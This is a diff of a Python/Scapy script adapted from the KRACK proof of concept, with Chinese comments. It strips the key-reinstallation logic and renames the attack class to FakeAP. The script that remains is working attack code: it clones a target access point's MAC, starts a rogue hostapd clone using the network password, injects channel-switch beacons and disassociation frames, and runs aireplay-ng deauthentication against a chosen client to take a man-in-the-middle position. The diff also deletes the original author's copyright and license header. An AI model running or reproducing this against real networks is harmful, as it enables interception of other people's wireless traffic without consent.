@@ -1,11 +1,5 @@
 #!/usr/bin/env python3
 
-# wpa_supplicant v2.4 - v2.6 all-zero encryption key attack
-# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
-#
-# This code may be distributed under the terms of the BSD license.
-# See README for more details.
-
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
@@ -83,12 +77,12 @@ class NetworkConfig():
 
 	def find_rogue_channel(self):
 		# 強盜 AP 頻道不是在 1 就是 11
-		self.rogue_channel = 1 if self.real_channel >= 6 else 8
+		self.rogue_channel = 1 if self.real_channel >= 6 else 11
 	
 	# hostapd.confg寫檔 
 	def write_config(self, iface):
 		TEMPLATE = """
-ctrl_interface=/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_ctrl
+ctrl_interface={locate}
 ctrl_interface_group=root
 
 interface={iface}
@@ -100,15 +94,15 @@ wpa_key_mgmt={akms}
 wpa_pairwise={pairwise}
 rsn_pairwise={pairwise}
 
-
 wmm_enabled={wmmenabled}
-
 hw_mode=g
 auth_algs=3
 wpa_passphrase={password}"""
 		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
 		ciphers2str = {2: "TKIP", 4: "CCMP"}
+		now_path = os.path.dirname(os.path.realpath(__file__))
 		return TEMPLATE.format(
+			locate = os.path.realpath(os.path.join(now_path, "../hostapd/hostapd_ctrl")),
 			iface = iface,
 			ssid = self.ssid,
 			channel = self.rogue_channel,
@@ -122,7 +116,7 @@ wpa_passphrase={password}"""
 			password = str(args.password))
 
 class ClientState():
-	Initializing, Connecting, GotMitm, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(7)
+	Initializing, Connecting, Failed = range(3)
 
 	def __init__(self, macaddr):
 		self.macaddr = macaddr
@@ -130,67 +124,16 @@ class ClientState():
 
 	def reset(self):
 		self.state = ClientState.Initializing
-		self.keystreams = dict()
-		self.attack_max_iv = None
-		self.attack_time = None
-
 		self.assocreq = None
-		self.msg1 = None
-		self.msg3s = []
-		self.msg4 = None
-		self.krack_finished = False
-
-	def store_msg1(self, msg1):
-		self.msg1 = msg1
-
-	def add_if_new_msg3(self, msg3):
-		if get_eapol_replaynum(msg3) in [get_eapol_replaynum(p) for p in self.msg3s]:
-			return
-		self.msg3s.append(msg3)
 
 	def update_state(self, state):
 		log(DEBUG, "Client %s moved to state %d" % (self.macaddr, state), showtime=False)
 		self.state = state
 
-	def mark_got_mitm(self):
-		if self.state <= ClientState.Connecting:
-			self.state = ClientState.GotMitm
-			log(STATUS, "Established MitM position against client %s (moved to state %d)" % (self.macaddr, self.state),
-				color="green", showtime=False)
-
 	def is_state(self, state):
 		return self.state == state
 
-	def should_forward(self, p, group):
-		if group:
-			# Forwarding rules when attacking the group handshake
-			return True
-		else:
-			# Forwarding rules when attacking the 4-way handshake
-			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
-				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
-				# 四次交握不轉送 msg4
-				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) or (p.type == 0 and p.subtype == 13)
-			return self.state in [ClientState.Success_Reinstalled]
-
-	def save_iv_keystream(self, iv, keystream):
-		self.keystreams[iv] = keystream
-
-	def get_keystream(self, iv):
-		return self.keystreams[iv]
-
-	def attack_start(self):
-		self.attack_max_iv = 0 if len(self.keystreams.keys()) == 0 else max(self.keystreams.keys())
-		self.attack_time = time.time()
-		self.update_state(ClientState.Attack_Started)
-
-	def is_iv_reused(self, iv):
-		return self.is_state(ClientState.Attack_Started) and iv in self.keystreams
-
-	def attack_timeout(self, iv):
-		return self.is_state(ClientState.Attack_Started) and self.attack_time + 1.5 < time.time() and self.attack_max_iv < iv
-
-class KRAckAttack():
+class FakeAP():
 	def __init__(self, nic_real_mon, nic_real_clientack, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None, cont_csa=False):
 		self.nic_real_mon = nic_real_mon
 		self.nic_real_clientack = nic_real_clientack
@@ -216,9 +159,6 @@ class KRAckAttack():
 		# 用來監控介面是否在適當的頻道中
 		self.last_real_beacon = None
 		self.last_rogue_beacon = None
-		# 用來攻擊/測試 group key handshake
-		self.group1 = []
-		self.time_forward_group1 = None
 
 	def find_beacon(self, ssid):
 		ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon)
@@ -241,8 +181,6 @@ class KRAckAttack():
 		if target: beacon.addr1 = target
 
 		for i in range(numbeacons):
-			# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
-			# followed by one with a value of 1. When starting with 1 it errors out.
 			csabeacon = append_csa(beacon, newchannel, 2)
 			self.sock_real.send(csabeacon, False, self.netconfig.real_channel)
 
@@ -257,33 +195,21 @@ class KRAckAttack():
 		self.sock_rogue.send(disas, True, self.netconfig.rogue_channel)
 		log(STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color="green")
 
-	def queue_disas(self, macaddr):
-		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
-		heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))
-
-	def try_channel_switch(self, macaddr):
-		self.send_csa_beacon()
-		self.queue_disas(macaddr)
-
 	def handle_rx_realchan(self):
 		p, origin_p = self.sock_real.recv()
+
 		if p == None: 
 			return
-
-		# 1. Handle frames sent TO the real AP
+		
 		if p.addr1 == self.apmac:
-			# If it's an authentication to the real AP, always display it ...
 			if p.haslayer(Dot11Auth):
-				print_rx(INFO, "Real channel ", p, color="orange", suffix=" --no forward !!")
-
-				# ... with an extra clear warning when we wanted to MitM this specific client
+				print_rx(INFO, "Real channel ", p, color="orange")
 				if self.clientmac == p.addr2:
 					log(WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)
 
 				if p.addr2 in self.clients: del self.clients[p.addr2]
-				# Send one targeted beacon pair (should be retransmitted in case of failure), and one normal broadcast pair
+
 				self.send_csa_beacon(target=p.addr2)
-				self.send_csa_beacon()
 				subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].update_state(ClientState.Connecting)
@@ -292,28 +218,23 @@ class KRAckAttack():
 			elif p.haslayer(Dot11AssoReq):
 				if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p
 
-			# Clients sending a deauthentication or disassociation to the real AP are also interesting ...
 			elif p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
 				if p.addr2 in self.clients: del self.clients[p.addr2]
 
-			# For all other frames, only display them if they come from the targeted client
 			elif self.clientmac is not None and self.clientmac == p.addr2:
-				print_rx(INFO, "Real channel ", p, suffix=" --no forward !!")
+				print_rx(INFO, "Real channel ", p)
 
-			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
-			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
-				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
+			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Connecting:
+				log(WARNING, "Injecting Null frame so AP thinks client %s is awake." % p.addr2)
 
 	def handle_rx_roguechan(self):
 		p, origin_p = self.sock_rogue.recv()
 		if p == None: return
-		
-		# Always display all frames sent by or to the targeted client
+
 		if p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Rogue channel", p, suffix="")
+			print_rx(INFO, "Rogue channel", p)
 
 	def handle_hostapd_out(self):
-		# hostapd always prints lines so this should not block
 		line = self.hostapd.stdout.readline()
 		if line == "":
 			log(ERROR, "Rogue hostapd instances unexpectedly closed")
@@ -337,36 +258,34 @@ class KRAckAttack():
 		subprocess.check_output(["ifconfig", self.nic_real_mon, "down"])
 		subprocess.check_output(["iwconfig", self.nic_real_mon, "mode", "monitor"])
 		time.sleep(0.2)
-
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])
 		subprocess.check_output(["iwconfig", self.nic_rogue_mon, "mode", "monitor"])
-		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
-
+		
 		#2. 如果有指定 client 端的 MAC addr.，將此網卡的 MAC addr.換成 client 端的
 		if self.clientmac:
 				subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
 				call_macchanger(self.nic_real_clientack, self.clientmac)
 		else:
-			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
-			log(WARNING, "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
-			# Sleep for a second to make this warning very explicit
+			log(WARNING, "WARNING: Targeting ALL clients is not supported! Please provide a specific target using --target.")
 			time.sleep(1)
 
-		# 3. Finally put the interfaces up
+		# 3. Put the interfaces up
 		subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
 	
 	# 主要執行 func.
 	def run(self, strict_echo_test=False):
+
 		self.configure_interfaces()
 		
 		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real_mon , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
-		# 測試監聽模式是否有正常運行，並且取得 wifi ap 的 MAC addr.
+		
 		self.find_beacon(self.ssid)
 		if self.beacon is None:
 			log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
 			return
+		
 		# 將 wifi ap 的 beacon 訊息紀錄，用來產生 hostapd.conf
 		self.netconfig = NetworkConfig()
 		self.netconfig.from_beacon(self.beacon)
@@ -381,22 +300,20 @@ class KRAckAttack():
 
 		log(STATUS, "Target network %s detected on channel %d" % (self.apmac, self.netconfig.real_channel), color="green")
 		log(STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")
+
 		# 將強盜 AP 的 MAC addr. 設成原始 AP 的 MAC addr.
 		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
 		set_mac_address(self.nic_rogue_ap, self.apmac)
 
-		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
 		if self.nic_real_clientack: 
 			subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
 			subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
 			subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
 
-		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_fakeap.conf")), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		self.hostapd = subprocess.Popen("hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_fakeap.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+		self.hostapd = subprocess.Popen("hostapd ../hostapd/hostapd_fakeap.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_fakeap.log", "w")
-		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(10)
 
@@ -407,7 +324,6 @@ class KRAckAttack():
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
 		subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
 	
-		# Continue attack by monitoring both channels and performing needed actions
 		self.last_real_beacon = time.time()
 		self.last_rogue_beacon = time.time()
 		nextbeacon = time.time() + 0.01
@@ -416,12 +332,6 @@ class KRAckAttack():
 			if self.sock_real      in sel[0]: self.handle_rx_realchan()
 			if self.sock_rogue     in sel[0]: self.handle_rx_roguechan()
 			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()
-
-			if self.time_forward_group1 and self.time_forward_group1 <= time.time():
-				p = self.group1.pop(0)
-				self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
-				self.time_forward_group1 = None
-				log(STATUS, "Injected older group message 1: %s" % dot11_to_str(p), color="green")
 
 			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
 				self.send_disas(self.disas_queue.pop()[1])
@@ -471,13 +381,13 @@ if __name__ == "__main__":
 	parser.add_argument("ssid", help="The SSID of the network to attack.")
 	parser.add_argument("password", help="The password of the network to attack.")
 
-	# 選擇性參數
+	# 其他參數
 	parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
 	parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
 	parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
 	parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames", action='store_true')
-	parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second)", action='store_true')
-	parser.add_argument("--group", help="Perform attacks on the group key handshake only", action='store_true')
+	parser.add_argument("--continuous-csa", action='store_true')
+	parser.add_argument("--group", action='store_true')
 
 	args = parser.parse_args()
 
@@ -485,7 +395,7 @@ if __name__ == "__main__":
 	set_global_log_level2(max(ALL, global_log_level - args.debug))
 
 	print("\n\t===[ channel-based MitM position by Mathy Vanhoef ]====\n")
-	attack = KRAckAttack(args.nic_real_mon, args.nic_real_clientack, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump, args.continuous_csa)
+	attack = FakeAP(args.nic_real_mon, args.nic_real_clientack, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump, args.continuous_csa)
 	atexit.register(cleanup)
 	attack.run(strict_echo_test=args.strict_echo_test)
 
